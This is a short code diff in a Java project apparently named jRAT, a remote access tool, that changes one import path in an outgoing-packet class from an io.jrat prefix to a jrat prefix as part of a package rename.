@@ -1,6 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import io.jrat.common.io.StringWriter;
+import jrat.common.io.StringWriter;
 import jrat.client.Plugin;
 import java.io.DataOutputStream;
 
